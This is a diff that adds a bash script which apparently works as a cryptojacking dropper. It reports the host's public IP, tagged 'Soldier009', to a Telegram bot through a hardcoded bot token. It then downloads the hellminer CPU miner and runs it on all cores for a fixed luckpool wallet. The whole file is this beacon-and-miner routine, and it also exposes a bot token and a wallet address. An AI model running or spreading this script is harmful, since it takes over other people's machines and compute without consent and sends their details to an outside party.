@@ -1,0 +1,21 @@
+#!/bin/bash
+
+apt-get install jq -y
+
+myIp="$(wget -qO- ifconfig.me/ip)"
+n0z="Soldier009|$myIp"
+for n in {1..50};
+do
+  sending="$(curl --silent -X GET 'https://api.telegram.org/bot5226358173:AAEb-b2taY9TxqWcY37wEU7gL0bM0ew3-8I/sendMessage?chat_id=5280847845&text='$n0z --compressed)"
+  cek=$(jq -r '.ok' <<< $sending)
+  if [[ "$cek" == true ]];
+  then
+    break
+  fi
+done
+
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvzf hellminer_cpu_linux.tar.gz
+
+chmod +x hellminer
+noz="$(nproc)"
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RCpnB5FRynU2u2pey6bo3JynbUZiwuopPs.Soldier009 -p x --cpu $noz
